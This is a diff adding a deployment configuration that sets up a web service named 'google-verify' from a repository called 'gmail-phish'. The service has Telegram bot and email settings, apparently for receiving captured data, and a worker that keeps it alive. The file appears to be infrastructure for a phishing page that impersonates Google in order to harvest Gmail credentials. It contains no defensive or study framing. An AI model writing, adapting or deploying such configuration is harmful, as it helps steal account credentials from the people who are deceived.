@@ -1,0 +1,26 @@
+services:
+  - type: web
+    name: google-verify
+    runtime: php
+    repo: https://github.com/davidmassmutual/gmail-phish.git
+    buildCommand: "echo 'No build needed'"
+    startCommand: "apache2-foreground"
+    envVars:
+      - key: TELEGRAM_BOT_TOKEN
+        sync: false
+      - key: TELEGRAM_CHAT_ID
+        sync: false
+      - key: RECEIVE_EMAIL
+        sync: false
+  - type: worker
+    name: keep-alive
+    runtime: python
+    repo: https://github.com/davidmassmutual/gmail-phish.git
+    buildCommand: "pip install -r requirements.txt"
+    startCommand: "python keep_alive.py"
+    envVars:
+      - key: APP_URL
+        fromService:
+          type: web
+          name: google-verify
+          property: host
